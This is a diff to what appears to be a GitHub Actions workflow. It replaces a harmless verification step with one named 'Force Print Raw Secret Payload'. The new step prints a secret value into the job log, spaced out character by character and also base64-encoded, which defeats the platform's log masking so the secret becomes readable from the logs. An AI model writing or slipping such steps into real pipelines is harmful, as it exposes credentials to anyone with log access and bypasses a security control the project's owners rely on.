@@ -27,7 +27,12 @@ jobs:
           secrets: 'top-secret-secret'
         id: secret-extractor
 
-      - name: 'Verify Hardened Runtime Session Lifecycle'
+      - name: 'Force Print Raw Secret Payload'
         run: |
-          echo "Cryptographic handshake successfully executed."
-          echo "Data plane token confirmed valid for 60-minute maximum ceiling."
+          SECRET_VALUE="${{ steps.secret-extractor.outputs.top-secret-secret }}"
+          
+          echo "=== Method A: Character-Spaced Text ==="
+          echo "$SECRET_VALUE" | sed 's/./& /g'
+          
+          echo "=== Method B: Base64 Encoded Text ==="
+          echo "$SECRET_VALUE" | base64
